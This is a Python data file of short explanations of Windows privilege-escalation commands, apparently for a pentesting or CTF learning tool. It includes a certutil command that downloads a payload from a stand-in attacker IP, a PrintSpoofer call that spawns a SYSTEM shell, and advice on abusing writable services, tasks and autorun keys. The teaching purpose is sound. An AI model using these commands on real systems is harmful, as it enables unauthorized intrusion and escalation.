"""Pre-authored ELI5 explanations for Windows privilege-escalation
enumeration commands."""
from __future__ import annotations

ENTRIES: dict[str, str] = {
    "whoami /priv": (
        "Lists the Windows privileges assigned to your current user "
        "token — special permissions beyond normal file access, like "
        "SeImpersonatePrivilege or SeBackupPrivilege. Certain "
        "privileges are directly exploitable for privesc (most famously "
        "SeImpersonatePrivilege, abused by tools like PrintSpoofer/"
        "JuicyPotato to get SYSTEM). Always worth checking right after a "
        "Windows foothold, the same way 'sudo -l' is on Linux."
    ),
    "whoami /groups": (
        "Lists every group the current Windows user belongs to. Some "
        "groups grant meaningful access beyond what a normal user has — "
        "worth checking against what those groups can actually do on "
        "this specific box."
    ),
    "systeminfo": (
        "Prints detailed information about the Windows install: OS "
        "version, build number, installed hotfixes/patches, and more. "
        "Worth checking the patch level against known local privilege "
        "escalation exploits — a box missing a specific security update "
        "sometimes has a public, working exploit for exactly that gap."
    ),
    "wmic qfe list": (
        "wmic (Windows Management Instrumentation Command-line) here "
        "lists installed Quick Fix Engineering updates — i.e. every "
        "patch/hotfix applied to the system. Similar purpose to "
        "systeminfo but sometimes gives a cleaner list to cross-check "
        "against known unpatched vulnerabilities."
    ),
    "net user": (
        "Lists every local user account on the Windows machine. The "
        "Windows equivalent of checking /etc/passwd on Linux — useful "
        "for seeing what accounts exist before deciding who else might "
        "be worth targeting or checking for weak passwords."
    ),
    "net localgroup administrators": (
        "Lists who's currently a member of the local Administrators "
        "group — the Windows equivalent of root/sudo access. Worth "
        "checking early: sometimes a low-privilege-looking account "
        "turns out to already be in this group due to a "
        "misconfiguration."
    ),
    "icacls <file/folder>": (
        "Shows detailed Windows file/folder permissions (access control "
        "lists) — who can read, write, or execute a given file. Useful "
        "for spotting a file or folder with permissions too loose for "
        "what it is, e.g. a service executable that a normal user can "
        "overwrite, which the service will then run with its own "
        "(often SYSTEM) privileges."
    ),
    "schtasks /query /fo LIST /v": (
        "Lists all scheduled tasks on the system with full detail "
        "(/v). Same idea as checking Linux cron jobs — a scheduled task "
        "that runs as SYSTEM but executes a script your current user "
        "can modify is a common, reliable privesc path."
    ),
    "reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'": (
        "Checks the Windows registry key that controls programs "
        "automatically launched at startup, for the local machine "
        "(HKLM) rather than the current user. Worth checking whether "
        "any listed program's file path is writable by your current "
        "user — replacing it means your code runs whenever that "
        "auto-start entry fires, potentially with elevated privileges."
    ),
    "certutil.exe -urlcache -f http://<attacker-ip>/file.exe file.exe": (
        "certutil is a legitimate Windows tool (normally for managing "
        "certificates) that can be abused to download a file from a "
        "URL, since it's built into Windows and less likely to be "
        "flagged than obviously bringing in a new tool. -urlcache -f "
        "downloads the file at the given URL and saves it locally — a "
        "common 'living off the land' technique for getting a payload "
        "onto a Windows box without needing external tools already "
        "present."
    ),
    "winPEAS.exe": (
        "Runs WinPEAS, the Windows counterpart to LinPEAS — an "
        "automated privilege-escalation enumeration tool that checks "
        "dozens of common Windows misconfigurations (weak service "
        "permissions, AlwaysInstallElevated, stored credentials, "
        "scheduled tasks, registry autoruns) and highlights promising "
        "findings in color. Good starting point, but manual review "
        "still matters — automated output can be long and easy to skim "
        "past something important."
    ),
    "PrintSpoofer.exe -i -c cmd": (
        "PrintSpoofer exploits SeImpersonatePrivilege (commonly held by "
        "service accounts like IIS's app pool identity) to escalate to "
        "SYSTEM, by abusing the Windows Print Spooler service's named "
        "pipe impersonation. -i runs it interactively, -c cmd sets the "
        "command to spawn once escalated (here, a SYSTEM-level command "
        "prompt). Requires SeImpersonatePrivilege to already be present "
        "(check with 'whoami /priv' first)."
    ),
}
